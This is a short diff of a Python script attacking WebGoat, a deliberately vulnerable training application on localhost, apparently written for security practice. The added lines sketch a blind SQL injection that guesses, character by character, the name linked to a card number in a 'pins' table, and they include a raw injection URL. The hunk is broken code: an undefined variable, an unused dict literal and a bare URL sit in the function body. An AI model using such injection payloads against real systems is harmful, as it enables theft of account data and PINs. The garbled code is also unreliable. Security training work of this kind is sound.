@@ -82,3 +82,15 @@ cat = httpclient()
 	
 data = cat.get('http://localhost:8080/WebGoat/plugin_extracted/plugin/ClientSideFiltering/jsp/clientSideFiltering.jsp?userId=112', {}, {('Cookie','JSESSIONID=A8A9EB6C28315BAE0E381B82CD81D894')})
 print(data.read())
+
+
+def confirm(data):
+	return 'Account number is valid' in data
+	
+
+def get_letter():
+	for letter in range(65,122):
+		{'Screen':267,'menu' :1100,
+		'account_number' : '102 and (1=(SELECT COUNT(*) from pins where substr(name,' + str(pos) + ',1)=\''+chr(letter)+'\' and cc_number=\'4321432143214321\' ))'}
+		http://localhost:8080/WebGoat/attack?Screen=267&menu=1100&account_number=102+and+(1%3D(SELECT+COUNT(*)+from+pins+where+cc_number%3D%274321432143214321%27))&SUBMIT=Go!
+	
